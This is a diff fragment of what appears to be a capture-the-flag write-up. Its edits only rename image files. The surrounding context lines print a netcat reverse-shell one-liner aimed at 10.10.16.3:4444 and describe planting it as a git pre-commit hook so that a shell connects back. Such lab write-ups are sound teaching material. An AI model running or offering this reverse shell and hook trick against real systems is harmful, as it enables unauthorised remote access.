@@ -18,7 +18,7 @@ Interestingly, we were allowed to download the entire repository here:
 
 <figure><img src="../../../.gitbook/assets/image (9) (2) (4).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (5) (2).png" alt=""><figcaption></figcaption></figure>
 
 The `source.zip` file also contained a `.git` repo that we could analyse later.
 
@@ -130,7 +130,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 10.10.16.3 4444 > /tmp/f
 
 Afterwards, we just need to name this script `pre-commit` and place it within the `~/.git/hooks` folder.
 
-<figure><img src="../../../.gitbook/assets/image (17) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (17) (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 After a few minutes, a listener port should catch a shell:
 
